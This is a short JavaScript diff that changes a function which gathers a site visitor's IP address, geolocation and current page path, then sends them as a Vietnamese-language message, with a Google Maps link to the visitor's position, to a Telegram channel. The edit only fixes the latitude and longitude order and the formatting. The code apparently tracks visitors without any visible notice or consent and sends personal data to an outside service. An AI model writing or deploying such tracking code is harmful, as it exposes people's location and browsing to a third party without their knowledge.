@@ -68,7 +68,9 @@ const gatherAndSendInfo = async () => {
   const ip = await takeIP();
   const location = await takelocation();
 
-  const message = `📍 Thông tin người dùng:\n- 🌐 IP: ${ip}\n- 📍Vị Trí: https://www.google.com/maps/place/${location.longitude},${location.latitude} \nTrang Truy Cập: ${pathName}`;
+  const message = `📍 Thông tin người dùng:\n- 🌐 IP: ${ip}
+  \n📍Vị Trí: https://www.google.com/maps/place/${location.latitude},${location.longitude}
+  \nTrang Truy Cập: ${pathName}`;
 
   console.log("Thông tin gửi đi:", message);
   await sendMessageToTelegram(message);
